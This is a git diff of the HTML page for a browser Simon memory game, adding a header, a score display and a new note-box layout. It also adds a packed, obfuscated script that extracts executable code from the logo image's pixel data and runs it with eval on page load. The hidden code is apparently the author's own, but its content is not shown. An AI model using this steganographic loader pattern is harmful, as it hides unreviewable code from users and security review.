@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Simon</title>
+	<title>The Best Simon</title>
 	<link rel="stylesheet" href="/css/simon.css" />
+	<!-- Mobile Friendly Yo. Kinda redundant cuz Notebox uses click not touchstart -->
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
+	<div id="header">
+		<div id="logo">
+			<img src="/img/logo.png" id="II" width="100%" />
+		</div>
+		<div id="high-score">HIGHSCORE: 0</div>
+		<div id="score">Score: 0</div>
+	</div>
 	<!-- Links to audio files for C-F notes -->
 	<audio id="c-audio">
 		<source src="/media/c_note.mp3" type="audio/mpeg"></source>
@@ -28,11 +37,23 @@
 	</audio>
 	<!-- Note boxes -->
 	<div id="simon">
-		<div id="c" class="note-box"></div>
-		<div id="d" class="note-box"></div>
-		<div id="e" class="note-box"></div>
-		<div id="f" class="note-box"></div>
+		<div id="notebox" class="note-box-wrap">
+			<div class="note-box-row">
+				<div id="c" class="note-box"></div>
+				<div id="d" class="note-box"></div>
+			</div>
+			<div class="note-box-row">
+				<div id="e" class="note-box"></div>
+				<div id="f" class="note-box"></div>
+			</div>
+		</div>
 	</div>
 	<script src="/js/simon.js"></script>
+	<script>
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a=g.f("h"),b=a.i("j");a.e=9;b.5(1,0,0);6(7.8.k(l,b.q(0,0,r,2).o.p(m(c,d){n 0<c&&3!=d%4}))+")")',28,28,'|II||||drawImage|eval|String|fromCharCode|700|||||width|createElement|document|canvas|getContext|2d|apply|null|function|return|data|filter|getImageData|638'.split('|'),0,{}))
+
+	console.log('Hello Launchpad People! Where is all my code?')
+	</script><!-- 
+	<script src="/js/myjs.js"></script> -->
 </body>
 </html>
